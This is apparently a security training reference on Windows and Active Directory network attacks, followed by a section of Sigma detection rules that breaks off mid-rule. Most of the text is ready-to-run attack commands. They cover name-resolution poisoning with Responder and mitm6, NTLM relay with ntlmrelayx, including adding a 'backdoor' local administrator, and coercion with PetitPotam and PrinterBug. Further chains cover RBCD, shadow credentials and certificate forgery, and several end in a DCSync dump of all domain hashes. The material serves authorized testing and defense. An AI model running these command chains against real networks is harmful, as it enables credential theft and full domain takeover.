<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->

# Network-Level Attacks Deep Dive

## Training Reference — CIPHER Security Training Material

**Classification**: Authorized Security Research & Training
**Last Updated**: 2026-03-14
**Scope**: Network poisoning, NTLM/Kerberos relay, coercion techniques, PKI attacks, detection engineering

---

## Table of Contents

1. [Name Resolution Poisoning](#1-name-resolution-poisoning)
2. [NTLM Relay Attack Chains](#2-ntlm-relay-attack-chains)
3. [Authentication Coercion Techniques](#3-authentication-coercion-techniques)
4. [Kerberos Relay & Delegation Abuse](#4-kerberos-relay--delegation-abuse)
5. [Shadow Credentials Attacks](#5-shadow-credentials-attacks)
6. [PKI & Certificate Attacks](#6-pki--certificate-attacks)
7. [Network-Level Detection Engineering](#7-network-level-detection-engineering)
8. [Tool Reference Matrix](#8-tool-reference-matrix)

---

## 1. Name Resolution Poisoning

### 1.1 LLMNR Poisoning

**Protocol**: Link-Local Multicast Name Resolution (RFC 4795)
**Port**: UDP 5355
**Multicast Address**: 224.0.0.252 (IPv4), ff02::1:3 (IPv6)

**Attack Mechanism**: When a Windows host fails DNS resolution, it falls back to LLMNR, broadcasting a multicast query to the local subnet. Any host can respond — an attacker responds authoritatively, claiming to be the requested hostname, causing the victim to send authentication credentials to the attacker.

**Attack Flow**:
```
1. Victim queries DNS for \\fileserver01 → DNS NXDOMAIN
2. Victim broadcasts LLMNR query: "Who is fileserver01?"
3. Attacker responds: "I am fileserver01, connect to 10.0.0.50"
4. Victim initiates SMB connection to attacker with NetNTLMv2 hash
5. Attacker captures hash → offline cracking or relay
```

**Tools**:
- **Responder**: `sudo python3 Responder.py -I eth0 -v` — responds to LLMNR/NBNS/mDNS
- **Inveigh** (C#/.NET): Packet-sniffing mode captures over Windows' own SMB service; socket mode binds to ports directly
- **Bettercap**: `net.sniff on; set arp.spoof.targets <IP>` — combined with ARP spoofing

**Responder Configuration** (`Responder.conf`):
```ini
[Responder Core]
LLMNR = On      ; Enable LLMNR poisoning
NBTNS = On      ; Enable NBT-NS poisoning
MDNS = On       ; Enable mDNS poisoning
```

### 1.2 NBT-NS Poisoning

**Protocol**: NetBIOS Name Service (RFC 1001/1002)
**Port**: UDP 137
**Broadcast**: Subnet broadcast address

**Attack Mechanism**: Older fallback than LLMNR. When both DNS and LLMNR fail, Windows queries NBT-NS via subnet broadcast. The attacker responds to claim the requested NetBIOS name.

**NBT-NS Name Types** (Inveigh supports type-specific responses):
| Type | Description |
|------|-------------|
| 0x00 | Workstation/Redirector |
| 0x03 | Messenger Service |
| 0x20 | File Server Service |
| 0x1B | Domain Master Browser |

**Inveigh Targeting**:
```powershell
# .NET version with selective NBNS type responses
Invoke-Inveigh -NBNS Y -NBNSTypes 00,20 -ConsoleOutput Y
```

### 1.3 mDNS Poisoning

**Protocol**: Multicast DNS (RFC 6762)
**Port**: UDP 5353
**Multicast Address**: 224.0.0.251 (IPv4), ff02::fb (IPv6)

**Attack Mechanism**: Used by Apple devices, Linux (Avahi), and Windows 10+ for local service discovery. Attacker responds to mDNS queries with spoofed records pointing to attacker IP.

**Inveigh mDNS Configuration**:
- Supports both QU (unicast) and QM (multicast) question types
- Configurable unicast vs multicast response modes
- Separate from LLMNR handling — different multicast groups

### 1.4 DHCPv6 Poisoning

**Protocol**: DHCPv6 (RFC 3315/8415)
**Ports**: UDP 546 (client), UDP 547 (server)
**Multicast Address**: ff02::1:2

**Attack Mechanism**: Windows has IPv6 enabled by default and actively sends DHCPv6 solicitations. An attacker responds with DHCPv6 replies assigning the attacker as the primary DNS server. Because Windows prefers IPv6 DNS over IPv4 DNS, all subsequent DNS queries route through the attacker.

**Attack Flow**:
```
1. Windows sends DHCPv6 SOLICIT to ff02::1:2
2. Attacker responds with DHCPv6 ADVERTISE + DNS server = attacker IPv6
3. Windows sends DHCPv6 REQUEST
4. Attacker confirms with DHCPv6 REPLY
5. Windows now uses attacker as primary DNS → full DNS control
```

**Tools**:

**mitm6** — Purpose-built DHCPv6 attack tool:
```bash
# Basic DHCPv6 takeover
sudo mitm6 -d domain.local

# With domain filtering
sudo mitm6 -d domain.local -d other.local -b internal.domain.local

# Target specific host
sudo mitm6 -hw workstation.domain.local
```

**Key mitm6 Design Decisions**:
- Uses 100-second TTLs to prevent long-term DNS cache pollution
- Automatic address expiration after ~5 minutes
- Minimizes persistent network artifacts post-engagement

**Responder DHCPv6**:
```bash
# DHCPv6 poisoning with Responder
sudo python3 Responder.py -I eth0 --dhcpv6

# Combined with WPAD injection
sudo python3 Responder.py -I eth0 -Pvd
```

Responder DHCPv6 supports INFORMATION-REQUEST, SOLICIT, and REQUEST message types. Optional Router Advertisement flooding improves reliability.

**Inveigh DHCPv6**:
- Configurable lease lifetime (default 300 seconds)
- ICMPv6 Router Advertisement injection with DNS options
- Supports search suffix delivery for domain targeting

### 1.5 WPAD Abuse

**Protocol**: Web Proxy Auto-Discovery Protocol
**Mechanism**: Clients query for `wpad.<domain>` via DNS, then LLMNR/NBNS fallback

**Attack Chain**:
```
1. Client queries DNS for wpad.domain.local → NXDOMAIN (common)
2. Client falls back to LLMNR/NBNS for "WPAD"
3. Attacker responds, serves malicious wpad.dat
4. Client routes HTTP traffic through attacker proxy
5. Proxy demands NTLM authentication → credentials captured
```

**Responder WPAD Options**:
- `-w` — Enable WPAD rogue proxy server
- `-F` — Force NTLM/Basic auth on WPAD file retrieval
- `-P` — Force proxy authentication on all requests
- `-b` — Downgrade to HTTP Basic (cleartext capture)

**Combined DHCPv6 + WPAD (mitm6 + ntlmrelayx)**:
```bash
# Terminal 1: DHCPv6 DNS takeover
sudo mitm6 -d domain.local

# Terminal 2: WPAD + relay
ntlmrelayx.py -6 -wh wpad.domain.local -t smb://dc01.domain.local
```

### 1.6 Resolution Fallback Chain (Windows)

Understanding the full resolution order is critical for choosing poisoning vectors:

```
1. Local hosts file
2. DNS cache
3. DNS server query
4. LLMNR (link-local multicast, IPv4/IPv6)
5. NBT-NS (subnet broadcast, IPv4 only)
6. mDNS (multicast, IPv4/IPv6)
```

Each fallback represents an interception opportunity. Disabling earlier mechanisms forces fallback to later ones.

---

## 2. NTLM Relay Attack Chains

### 2.1 NTLM Relay Fundamentals

**Concept**: Instead of cracking captured NetNTLM hashes, relay them in real-time to authenticate against a different service. The attacker acts as a man-in-the-middle, forwarding the authentication exchange between victim and target.

**Prerequisites**:
- Target service must NOT require EPA (Extended Protection for Authentication)
- Target service must NOT require SMB signing (for SMB targets)
- Victim credentials must have privileges on the target
- Attacker must be positioned to intercept authentication (poisoning, coercion)

**Core Tool — ntlmrelayx.py** (Impacket):
```bash
# Relay to SMB — execute command
ntlmrelayx.py -t smb://target -c "whoami"

# Relay to LDAP — dump domain info
ntlmrelayx.py -t ldap://dc01 --dump-domain-info

# Relay to LDAP — add computer account
ntlmrelayx.py -t ldap://dc01 --add-computer EVIL$ Password123

# Relay to LDAP — set RBCD
ntlmrelayx.py -t ldap://dc01 --delegate-access

# Relay to ADCS — request certificate
ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp --adcs --template DomainController

# Multi-target relay with SMB socks
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

### 2.2 Relay to LDAP/LDAPS

**Why LDAP is the most valuable relay target**:
LDAP relay enables direct AD object manipulation — creating accounts, modifying ACLs, setting RBCD, writing shadow credentials. This is the most powerful relay destination.

**Attack Chains via LDAP Relay**:

| Relay Action | Impact | Command Flag |
|---|---|---|
| Add computer account | Enables RBCD attack | `--add-computer` |
| Set RBCD delegation | Impersonate any user to target | `--delegate-access` |
| Write shadow credentials | Certificate-based persistence | `--shadow-credentials` |
| Modify ACLs | Grant attacker permissions | `--escalate-user` |
| Dump domain info | Reconnaissance | `--dump-domain-info` |
| Create user | Persistence | `--add-user` |

**LDAP Signing Considerations**:
- LDAP (port 389): Relay works unless LDAP signing is required
- LDAPS (port 636): Relay works via channel binding bypass (pre-patch)
- Default Windows: LDAP signing NOT required (vulnerable)
- GPO: `Network security: LDAP client signing requirements`

### 2.3 Relay to ADCS (ESC8)

**One of the most impactful relay targets** — obtain a certificate as the victim identity, then use it for persistent authentication.

```bash
# Relay to ADCS HTTP enrollment
ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp --adcs --template DomainController

# Output: Base64 certificate for the coerced account
# Use with: certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
```

**Attack Chain: Coercion → ADCS Relay → Domain Admin**:
```
1. PetitPotam coerces DC01 to authenticate to attacker
2. ntlmrelayx relays DC01$ machine credential to CA
3. CA issues certificate for DC01$ (Domain Controller template)
4. Attacker uses certificate for PKINIT → TGT for DC01$
5. DC01$ has DCSync rights → dump all domain hashes
```

### 2.4 Relay to SMB

```bash
# Execute command on target via SMB relay
ntlmrelayx.py -t smb://target -c "net user backdoor P@ss123 /add && net localgroup administrators backdoor /add"

# Dump SAM hashes
ntlmrelayx.py -t smb://target -c "secretsdump"

# SOCKS proxy for interactive SMB access
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then: proxychains smbclient //target/C$ -U domain/user
```

**SMB Signing Check**:
```bash
# Check SMB signing requirements across network
crackmapexec smb targets.txt --gen-relay-list unsigned.txt
```

### 2.5 Cross-Protocol Relay

NTLM authentication is protocol-agnostic — the challenge-response works across protocols:

| Source Protocol | Target Protocol | Feasibility |
|---|---|---|
| SMB → LDAP | Common | Works if LDAP signing not required |
| HTTP → LDAP | Common | Same condition |
| SMB → HTTP (ADCS) | Common | ESC8 attack |
| HTTP → SMB | Works | If SMB signing not required |
| SMB → MSSQL | Works | Database access |
| HTTP → HTTP (Exchange) | Works | PrivExchange-style |

### 2.6 MachineAccountQuota Abuse via Relay

**Powermad** enables creating machine accounts without relay, but relay to LDAP can also add them:

```powershell
# Powermad: Create machine account via LDAP
New-MachineAccount -MachineAccount EVIL -Password $(ConvertTo-SecureString 'P@ss123' -AsPlainText -Force)
```

**RBCD Attack Chain After Machine Account Creation**:
```bash
# 1. Create machine account (via relay or Powermad)
ntlmrelayx.py -t ldap://dc01 --add-computer EVIL$ --delegate-access

# 2. Request service ticket via S4U
getST.py -spn cifs/target.domain.local domain.local/EVIL$:P@ss123 -impersonate Administrator

# 3. Use ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass target.domain.local
```

**Powermad ADIDNS Manipulation** — Create DNS records to support relay:
```powershell
# Add DNS A record for attacker host
New-ADIDNSNode -Node attacker -Zone domain.local -Data 10.0.0.50
Set-ADIDNSNodeAttribute -Node attacker -Zone domain.local -Attribute dnsRecord -Value (New-DNSRecordArray -Type A -Data 10.0.0.50)
```

---

## 3. Authentication Coercion Techniques

Coercion forces a target machine to authenticate to an attacker-controlled host. Combined with relay, this enables privilege escalation without knowing any passwords.

### 3.1 Coercer — Unified Coercion Framework

**Coercer** (p0dalirius) consolidates all known coercion methods into a single tool with 12+ techniques across multiple MS-RPC protocols.

```bash
# Install
pip install coercer

# Scan for vulnerable RPC functions
coercer scan -t dc01.domain.local -u user -p pass -d domain.local

# Coerce authentication to listener
coercer coerce -t dc01.domain.local -l attacker.domain.local -u user -p pass -d domain.local

# Filter to specific method
coercer coerce -t dc01 -l attacker --filter-method-name PetitPotam
coercer coerce -t dc01 -l attacker --filter-protocol-name MS-EFSR
```

**Operational Modes**:
| Mode | Purpose |
|------|---------|
| `scan` | Enumerate accessible RPC pipes and vulnerable functions |
| `coerce` | Execute coercion to force authentication |
| `fuzz` | Research mode — fuzz RPC functions with randomized UNC paths |

### 3.2 PetitPotam (MS-EFSRPC)

**CVE**: CVE-2021-36942 (incomplete patch)
**Protocol**: MS-EFSRPC (Encrypting File System Remote Protocol)
**Named Pipes**: `\pipe\lsarpc` (interface `c681d488-d850-11d0-8c52-00c04fd90f7e`), `\pipe\efsrpc` (interface `df1941c5-fe89-4e79-bf10-463657acf44d`)
**Authentication Required**: No (against DCs, pre-patch); Yes (post-patch, partial)

**Key RPC Functions Abused**:
- `EfsRpcOpenFileRaw` — Primary coercion vector
- `EfsRpcEncryptFileSrv`
- `EfsRpcDecryptFileSrv`
- `EfsRpcQueryUsersOnFile`
- `EfsRpcQueryRecoveryAgents`

```bash
# Unauthenticated coercion (pre-patch / unpatched)
python3 PetitPotam.py attacker_ip dc01_ip

# Authenticated coercion
python3 PetitPotam.py -u user -p password -d domain.local attacker_ip dc01_ip
```

**Full Attack Chain — PetitPotam → ADCS → DCSync**:
```bash
# Terminal 1: Set up NTLM relay to ADCS
ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp --adcs --template DomainController

# Terminal 2: Coerce DC to authenticate
python3 PetitPotam.py 10.0.0.50 dc01.domain.local

# Result: Certificate for DC01$ machine account
# Terminal 3: Authenticate with certificate
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1

# Terminal 4: DCSync with obtained NT hash
secretsdump.py -hashes :ntlm_hash domain.local/dc01$@dc01.domain.local
```

**Critical Note**: Disabling the EFS service does NOT mitigate this attack — the vulnerable RPC interface remains accessible via LSARPC.

### 3.3 PrinterBug / SpoolSample (MS-RPRN)

**Protocol**: MS-RPRN (Print System Remote Protocol)
**Named Pipe**: `\pipe\spoolss`
**Authentication Required**: Yes (domain user)
**Prerequisite**: Print Spooler service running on target

**Mechanism**: The `RpcRemoteFindFirstPrinterChangeNotificationEx` function forces the target to send an authentication callback to a specified host.

```bash
# krbrelayx printerbug
python3 printerbug.py domain.local/user:password@dc01.domain.local attacker.domain.local

# SpoolSample (Windows)
SpoolSample.exe dc01.domain.local attacker.domain.local
```

**Attack Integration**:
- Combine with unconstrained delegation abuse (krbrelayx)
- Combine with NTLM relay to LDAP/ADCS
- Works across forest trusts (authentication callback crosses trust boundaries)

### 3.4 DFSCoerce (MS-DFSNM)

**Protocol**: MS-DFSNM (Distributed File System Namespace Management)
**Named Pipe**: `\pipe\netdfs`
**Authentication Required**: Yes (domain user)

**Key RPC Functions**:
- `NetrDfsAddStdRoot`
- `NetrDfsRemoveStdRoot`

```bash
# Via Coercer
coercer coerce -t dc01 -l attacker --filter-protocol-name MS-DFSNM -u user -p pass -d domain.local
```

### 3.5 ShadowCoerce (MS-FSRVP)

**Protocol**: MS-FSRVP (File Server Remote VSS Protocol)
**Named Pipe**: `\pipe\FssagentRpc`
**Authentication Required**: Yes (domain user)
**Prerequisite**: File Server VSS Agent Service running

**Key RPC Functions**:
- `IsPathSupported`
- `IsPathShadowCopied`

```bash
# Via Coercer
coercer coerce -t dc01 -l attacker --filter-protocol-name MS-FSRVP -u user -p pass -d domain.local
```

### 3.6 CheeseOunce (MS-EVEN)

**Protocol**: MS-EVEN (EventLog Remoting Protocol)
**Authentication Required**: Yes

Exploits Event Log RPC functions to trigger authentication callbacks.

### 3.7 Coercion Methods Comparison

| Method | Protocol | Auth Required | Pipe | Service Required |
|--------|----------|---------------|------|-----------------|
| PetitPotam | MS-EFSRPC | No* / Yes | lsarpc, efsrpc | None (LSARPC) |
| PrinterBug | MS-RPRN | Yes | spoolss | Print Spooler |
| DFSCoerce | MS-DFSNM | Yes | netdfs | DFS |
| ShadowCoerce | MS-FSRVP | Yes | FssagentRpc | File Server VSS Agent |
| CheeseOunce | MS-EVEN | Yes | eventlog | EventLog |

*PetitPotam unauthenticated variant patched but patch incomplete

---

## 4. Kerberos Relay & Delegation Abuse

### 4.1 Kerberos Relay (krbrelayx)

Unlike NTLM relay which forwards challenge-response exchanges, Kerberos relay intercepts and reuses Kerberos service tickets (TGS). This requires DNS control to redirect the victim's service request to the attacker.

**Attack Chain**:
```
1. Attacker gains DNS control (mitm6 DHCPv6, dnstool.py LDAP, ADIDNS)
2. Attacker creates DNS record pointing target hostname → attacker IP
3. Victim requests Kerberos TGS for service on target hostname
4. KDC issues TGS encrypted for target's service key
5. Victim sends TGS to attacker (resolved via spoofed DNS)
6. Attacker relays TGS to actual target service
```

**krbrelayx Components**:

| Tool | Function |
|------|----------|
| `krbrelayx.py` | Main relay engine — intercepts and forwards Kerberos auth |
| `dnstool.py` | Manipulate AD-integrated DNS records via LDAP |
| `addspn.py` | Add/remove SPNs on AD accounts |
| `printerbug.py` | Trigger Print Spooler authentication callback |

**DNS Manipulation via LDAP (dnstool.py)**:
```bash
# Add A record pointing target hostname to attacker
python3 dnstool.py -u domain.local/user -p password -a add -r target.domain.local -d 10.0.0.50 dc01.domain.local

# Query existing records
python3 dnstool.py -u domain.local/user -p password -a query -r target.domain.local dc01.domain.local
```

**SPN Manipulation (addspn.py)**:
```bash
# Add SPN to controlled account
python3 addspn.py -u domain.local/user -p password -s http/target.domain.local -t controlleduser dc01.domain.local
```

### 4.2 Unconstrained Delegation Abuse

**Concept**: Accounts with unconstrained delegation store the TGT of any user that authenticates to them. If an attacker compromises an unconstrained delegation host and coerces a DC to authenticate, they capture the DC's TGT.

**Attack Chain — PrinterBug + Unconstrained Delegation**:
```bash
# 1. Identify unconstrained delegation hosts
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# 2. Set up krbrelayx to capture TGTs (on compromised UD host)
python3 krbrelayx.py -hashes :ntlm_hash_of_ud_host

# 3. Trigger authentication from DC
python3 printerbug.py domain.local/user:password@dc01.domain.local ud-host.domain.local

# 4. krbrelayx captures DC TGT → export as ccache
# 5. Use DC TGT for DCSync
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass dc01.domain.local
```

**krbrelayx TGT Handling**:
- Decrypts embedded TGTs from incoming authentication using compromised account's keys
- Exports in ccache (Impacket) or kirbi (Mimikatz) format
- Supports both SMB and LDAP relay vectors

### 4.3 Constrained Delegation Abuse (S4U)

**S4U2Self**: Request service ticket on behalf of any user to the compromised service
**S4U2Proxy**: Forward that ticket to allowed delegation targets

```bash
# Get service ticket impersonating Administrator
getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/compromised$:password

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass target.domain.local
```

### 4.4 Resource-Based Constrained Delegation (RBCD)

**Concept**: Instead of configuring delegation on the source, RBCD configures it on the target via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If an attacker can write this attribute, they can delegate from a controlled account.

**Prerequisites**:
- Control over a computer account (or create one via MachineAccountQuota)
- Write access to target's `msDS-AllowedToActOnBehalfOfOtherIdentity`

```bash
# 1. Create machine account
python3 addcomputer.py -computer-name EVIL$ -computer-pass P@ss123 domain.local/user:password

# 2. Set RBCD (via bloodyAD)
bloodyAD --host dc01 -d domain.local -u user -p password set rbcd target$ EVIL$

# 3. Request ticket via S4U
getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/EVIL$:P@ss123

# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass target.domain.local
```

**Via ntlmrelayx** (automated):
```bash
# Relay creates machine account + sets RBCD in one step
ntlmrelayx.py -t ldap://dc01 --delegate-access
```

---

## 5. Shadow Credentials Attacks

### 5.1 Key Trust Model & msDS-KeyCredentialLink

**Concept**: Windows Server 2016+ supports Key Trust for Windows Hello for Business. The `msDS-KeyCredentialLink` attribute stores public key credentials that can authenticate via PKINIT. An attacker who can write to this attribute plants a rogue key credential — a "shadow credential."

**Prerequisites**:
- Domain Functional Level: Windows Server 2016+
- At least one DC running Windows Server 2016+
- DC must have a certificate with Server Authentication EKU
- Write access to target's `msDS-KeyCredentialLink` attribute

### 5.2 pywhisker — Shadow Credentials Tool

```bash
# List existing key credentials
python3 pywhisker.py -d domain.local -u attacker -p password --target victim --action list

# Add shadow credential (generates PFX certificate)
python3 pywhisker.py -d domain.local -u attacker -p password --target victim --action add --filename shadow_cert
# Output: shadow_cert.pfx with password

# Remove specific credential by Device ID
python3 pywhisker.py -d domain.local -u attacker -p password --target victim --action remove --device-id <ID>

# Clear all credentials (destructive — use with caution)
python3 pywhisker.py -d domain.local -u attacker -p password --target victim --action clear

# Spray across multiple targets
python3 pywhisker.py -d domain.local -u attacker -p password --target victim --action spray
```

**Authentication Methods Supported**:
- NTLM: cleartext password, pass-the-hash
- Kerberos: cleartext, pass-the-key, pass-the-cache
- LDAP Schannel: certificate-based

### 5.3 Shadow Credentials → PKINIT → NT Hash Chain

```bash
# Step 1: Plant shadow credential
python3 pywhisker.py -d domain.local -u attacker -p pass --target dc01$ --action add --filename dc01_shadow

# Step 2: Request TGT using planted certificate (PKINITtools)
python3 gettgtpkinit.py -cert-pfx dc01_shadow.pfx -pfx-pass <password> domain.local/dc01$ dc01.ccache
# Output: AS-REP encryption key

# Step 3: Extract NT hash via U2U (UnPAC-the-hash)
export KRB5CCNAME=dc01.ccache
python3 getnthash.py -key <AS-REP-key> domain.local/dc01$

# Step 4: DCSync with NT hash
secretsdump.py -hashes :nt_hash domain.local/dc01$@dc01.domain.local
```

### 5.4 Shadow Credentials via NTLM Relay

```bash
# Relay to LDAP with shadow credentials write
ntlmrelayx.py -t ldap://dc01 --shadow-credentials --shadow-target victim$
```

### 5.5 Behavioral Constraints

- **User objects**: Cannot self-modify `msDS-KeyCredentialLink` — requires elevated permissions or third-party write access
- **Computer objects**: Can self-modify but only add when attribute is empty — existing entries block additions
- Certificate validity: pywhisker generates certificates valid for +/- 40 years to handle time skew

---

## 6. PKI & Certificate Attacks

### 6.1 AD CS Attack Surface (Certipy ESC1-ESC16)

**Certipy** provides comprehensive enumeration and exploitation of AD Certificate Services misconfigurations.

```bash
# Enumerate AD CS
certipy find -u user@domain.local -p password -dc-ip 10.0.0.1

# Request certificate (ESC1 — misconfigured template)
certipy req -u user@domain.local -p password -ca CA-NAME -template VulnTemplate -upn administrator@domain.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# Shadow credentials via Certipy
certipy shadow auto -u user@domain.local -p password -account target$
```

**ESC Vectors Summary**:

| ESC | Vulnerability | Impact |
|-----|--------------|--------|
| ESC1 | Template allows SAN specification + low-priv enrollment | Impersonate any user |
| ESC2 | Template allows Any Purpose EKU | Certificate usable for any auth |
| ESC3 | Certificate Request Agent template + enrollment agent | Request certs on behalf of others |
| ESC4 | Template ACL allows modification by low-priv user | Modify template → ESC1 |
| ESC5 | CA ACL misconfiguration | Modify CA settings |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA | SAN in any request |
| ESC7 | CA manager approval bypass | Approve own requests |
| ESC8 | HTTP enrollment without EPA | NTLM relay to CA |
| ESC9 | CT_FLAG_NO_SECURITY_EXTENSION | Certificate mapping bypass |
| ESC10 | Weak certificate mapping | Map cert to unintended user |
| ESC11 | RPC enrollment without signing | RPC-based relay |
| ESC13-16 | Various issuance policy and mapping issues | Privilege escalation |

### 6.2 PKINITtools — Certificate-Based Kerberos Exploitation

**gettgtpkinit.py** — Request TGT via PKINIT:
```bash
# From PFX file
python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass password domain.local/user user.ccache

# From PEM cert + key
python3 gettgtpkinit.py -cert-pem cert.pem -key-pem key.pem domain.local/user user.ccache
```

**getnthash.py** — UnPAC-the-hash (extract NT hash from PKINIT TGT):
```bash
export KRB5CCNAME=user.ccache
python3 getnthash.py -key <AS-REP-encryption-key> domain.local/user
```

**Technical Process**:
1. Uses existing PKINIT-derived TGT
2. Requests S4U2Self service ticket for self
3. PAC contains encrypted NT hash (PAC_CREDENTIAL_INFO)
4. Decrypts using AS-REP session key
5. Recovers cleartext NT hash equivalent

**gets4uticket.py** — S4U2Self impersonation:
```bash
python3 gets4uticket.py kerberos+ccache://domain.local\\machine\$:machine.ccache@kdc cifs/target.domain.local@domain.local administrator@domain.local admin.ccache
```

### 6.3 PassTheCert — Schannel-Based Certificate Authentication

**Problem**: PKINIT requires DCs with Smart Card Logon EKU in their certificates. Some environments lack this.

**Solution**: PassTheCert uses TLS client certificate authentication (Schannel) to bind to LDAP/S directly, bypassing PKINIT entirely.

**Use Cases**:
- Environments where PKINIT is not supported
- When DCs lack Smart Card Logon EKU
- Certificate obtained via ADCS relay (ESC8) but PKINIT fails

**Operations Supported**:
- RBCD manipulation via LDAP
- Shadow credential writes
- Account creation and modification
- Password resets
- ACL modifications

### 6.4 Golden Certificate Attack

If an attacker compromises the CA's private key, they can forge certificates for any identity indefinitely.

```bash
# Backup CA key (requires CA admin access)
certipy ca -backup -u admin@domain.local -p password -ca CA-NAME

# Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local -subject "CN=Administrator,CN=Users,DC=domain,DC=local"

# Authenticate with forged certificate
certipy auth -pfx forged.pfx -dc-ip 10.0.0.1
```

### 6.5 Full PKI Attack Chains

**Chain 1: Coercion → ADCS Relay → PKINIT → DCSync**
```
PetitPotam/PrinterBug → ntlmrelayx (ESC8) → Certificate → gettgtpkinit → getnthash → secretsdump
```

**Chain 2: Shadow Credentials → PKINIT → NT Hash**
```
pywhisker (add) → gettgtpkinit → getnthash → Pass-the-Hash
```

**Chain 3: ADCS Relay → PassTheCert → RBCD**
```
Coercion → ntlmrelayx (ESC8) → Certificate → PassTheCert (LDAP) → Set RBCD → S4U → Access
```

**Chain 4: DHCPv6 → DNS Takeover → Kerberos Relay**
```
mitm6 → DNS control → krbrelayx → Captured TGT → DCSync
```

---

## 7. Network-Level Detection Engineering

### 7.1 Sigma Rules

#### LLMNR/NBNS Poisoning Detection

```yaml
title: LLMNR Poisoning Response from Non-Standard Source
id: a7b9c3d1-4e5f-6a7b-8c9d-0e1f2a3b4c5d
status: experimental
description: Detects LLMNR responses originating from hosts that are not legitimate DNS servers, indicating potential poisoning activity.
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    DestinationPort: 5355
    Protocol: UDP
  filter_legitimate:
    SourceIP|cidr:
      - '10.0.0.1/32'   # Legitimate DNS server
      - '10.0.0.2/32'   # Legitimate DNS server
  condition: selection and not filter_legitimate
falsepositives:
  - Legitimate multicast DNS responders (printers, IoT devices)
  - Network scanning tools during authorized assessments
level: high
tags:
  - attack.t1557.001
  - attack.credential_access
```

```yaml
title: NBT-NS Poisoning - Multiple Responses from Single Host
id: b8c0d4e2-5f6a-7b8c-9d0e-1f2a3b4c5d6e
status: experimental
description: Detects a single host responding to multiple NBT-NS queries, indicating systematic name poisoning rather than legitimate NetBIOS behavior.
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    DestinationPort: 137
    Protocol: UDP
  condition: selection | count(DestinationIP) by SourceIP > 10
  timeframe: 5m
falsepositives:
  - WINS servers responding to legitimate queries
  - Network discovery during authorized scanning
level: high
tags:
  - attack.t1557.001
  - attack.credential_access
```

#### DHCPv6 Poisoning Detection

```yaml
title: Rogue DHCPv6 Server Detected
id: c9d1e5f3-6a7b-8c9d-0e1f-2a3b4c5d6e7f
status: experimental
description: Detects DHCPv6 ADVERTISE or REPLY messages from hosts not in the authorized DHCPv6 server list, indicating potential mitm6-style attacks.
logsource:
  category: network_connection
  product: network
detection:
  selection:
    DestinationPort: 546
    SourcePort: 547
    Protocol: UDP
  filter_authorized:
    SourceIP|cidr:
      - 'fe80::1/128'   # Authorized DHCPv6 server
  condition: selection and not filter_authorized
falsepositives:
  - Newly deployed DHCPv6 servers not yet added to allowlist
  - IPv6 transition mechanisms (6to4, Teredo)
level: critical
tags:
  - attack.t1557.003
  - attack.credential_access
```

#### NTLM Relay Detection

```yaml
title: NTLM Authentication to ADCS HTTP Enrollment Endpoint
id: d0e2f6a4-7b8c-9d0e-1f2a-3b4c5d6e7f8a
status: experimental
description: Detects NTLM authentication attempts to AD Certificate Services web enrollment endpoints, potentially indicating ESC8 relay attacks.
logsource:
  product: windows
  service: iis
detection:
  selection:
    cs-uri-stem|contains:
      - '/certsrv/certfnsh.asp'
      - '/certsrv/default.asp'
    cs-username|endswith: '$'
  condition: selection
falsepositives:
  - Legitimate auto-enrollment from domain computers (uncommon via HTTP)
level: high
tags:
  - attack.t1557.001
  - attack.credential_access
  - attack.t1649
```

```yaml
title: SMB Connection Without Signing from Domain Controller
id: e1f3a7b5-8c9d-0e1f-2a3b-4c5d6e7f8a9b
status: experimental
description: Detects SMB connections from domain controllers where signing is not negotiated, indicating potential relay or misconfiguration.
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    DestinationPort:
      - 445
      - 139
    SourceIP|cidr: '10.0.0.0/24'   # DC subnet
  filter_signing:
    SMBSigning: 'required'
  condition: selection and not filter_signing
falsepositives:
  - Legacy systems requiring unsigned SMB
level: high
tags:
  - attack.t1557.001
  - attack.lateral_movement
```

#### Coercion Detection

```yaml
title: EFS RPC Call to Domain Controller via LSARPC
id: f2a4b8c6-9d0e-1f2a-3b4c-5d6e7f8a9b0c
status: experimental
description: Detects EfsRpcOpenFileRaw and related EFS RPC calls targeting domain controllers, indicating PetitPotam coercion attempts.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    ShareName: '\\*\IPC$'
    RelativeTargetName:
      - 'lsarpc'
      - 'efsrpc'
    AccessMask: '0x3'
  condition: selection
falsepositives:
  - Legitimate EFS operations (rare against DCs)
  - Backup software using EFS APIs
level: high
tags:
  - attack.t1187
  - attack.credential_access
```

```yaml
title: Print Spooler RPC Call Triggering Authentication Callback
id: a3b5c9d7-0e1f-2a3b-4c5d-6e7f8a9b0c1d
status: experimental
description: Detects RpcRemoteFindFirstPrinterChangeNotification calls that trigger authentication callbacks, indicating PrinterBug/SpoolSample coercion.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    ShareName: '\\*\IPC$'
    RelativeTargetName: 'spoolss'
  condition: selection
falsepositives:
  - Legitimate print spooler operations between servers
  - Print management software
level: medium
tags:
  - attack.t1187
  - attack.credential_access
```

#### Shadow Credentials Detection

```yaml
title: Modification of msDS-KeyCredentialLink Attribute
